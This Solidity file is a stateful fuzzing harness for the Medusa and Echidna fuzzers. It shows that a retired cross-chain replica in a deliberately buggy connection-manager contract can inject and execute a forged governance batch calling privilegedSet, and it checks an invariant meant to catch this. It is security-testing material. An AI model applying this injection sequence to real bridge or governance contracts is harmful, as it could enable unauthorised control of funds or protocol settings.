// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {XAppConnectionManagerBug} from "./XAppConnectionManagerHarness.sol";
import {
    GovernanceBatchInjectionTarget,
    GovernanceBatchMessageLite,
    GovernanceBatchReplicaCallerHarness
} from "./GovernanceBatchInjectionHarness.sol";

/// @notice Stateful harness proving stale replica can inject and execute forged governance batches.
contract MedusaGovernanceBatchInjectionHarness {
    uint32 internal constant ENROLL_DOMAIN = 1;
    uint32 internal constant GOVERNOR_DOMAIN = 2000;
    bytes32 internal constant GOVERNOR_ROUTER = bytes32(uint256(0xBEEF));

    XAppConnectionManagerBug public xcm;
    GovernanceBatchInjectionTarget public gov;
    GovernanceBatchReplicaCallerHarness public r1;
    GovernanceBatchReplicaCallerHarness public r2;

    mapping(address => bool) public retiredReplica;
    bool public retiredReplicaExecutedBatch;

    constructor() {
        xcm = new XAppConnectionManagerBug();
        gov = new GovernanceBatchInjectionTarget(
            address(xcm),
            GOVERNOR_DOMAIN,
            GOVERNOR_ROUTER
        );
        r1 = new GovernanceBatchReplicaCallerHarness();
        r2 = new GovernanceBatchReplicaCallerHarness();
    }

    function _pickReplicaAddress(uint8 _id) internal view returns (address) {
        return _id % 2 == 0 ? address(r1) : address(r2);
    }

    function _pickReplicaCaller(uint8 _id)
        internal
        view
        returns (GovernanceBatchReplicaCallerHarness)
    {
        return _id % 2 == 0 ? r1 : r2;
    }

    // -------- Actions --------

    function action_enrollReplica(uint8 _replicaId) external {
        address _next = _pickReplicaAddress(_replicaId);
        address _current = xcm.domainToReplica(ENROLL_DOMAIN);
        if (_current != address(0) && _current != _next) {
            retiredReplica[_current] = true;
        }
        xcm.ownerEnrollReplica(_next, ENROLL_DOMAIN);
    }

    function action_tryInjectAndExecuteBatch(uint8 _replicaId, uint256 _value)
        external
    {
        GovernanceBatchReplicaCallerHarness _replica = _pickReplicaCaller(_replicaId);

        GovernanceBatchMessageLite.Call[]
            memory _calls = new GovernanceBatchMessageLite.Call[](1);
        _calls[0] = GovernanceBatchMessageLite.Call({
            to: bytes32(uint256(uint160(address(gov)))),
            data: abi.encodeWithSignature("privilegedSet(uint256)", _value)
        });

        bytes32 _hash = GovernanceBatchMessageLite.getBatchHash(_calls);
        bytes memory _batchMsg = GovernanceBatchMessageLite.formatBatch(_hash);

        (bool _okHandle, ) = _replica.callHandle(
            address(gov),
            GOVERNOR_DOMAIN,
            0,
            GOVERNOR_ROUTER,
            _batchMsg
        );

        if (_okHandle && retiredReplica[address(_replica)]) {
            try gov.executeCallBatch(_calls) {
                if (gov.criticalValue() == _value) {
                    retiredReplicaExecutedBatch = true;
                }
            } catch {}
        }
    }

    // -------- Invariant --------

    /// @notice Retired replicas should never be able to execute forged governance batches.
    function property_retired_replica_cannot_execute_forged_batch()
        external
        view
        returns (bool)
    {
        return !retiredReplicaExecutedBatch;
    }

    /// @notice Echidna-compatible alias for the same invariant.
    function echidna_retired_replica_cannot_execute_forged_batch()
        external
        view
        returns (bool)
    {
        return !retiredReplicaExecutedBatch;
    }
}

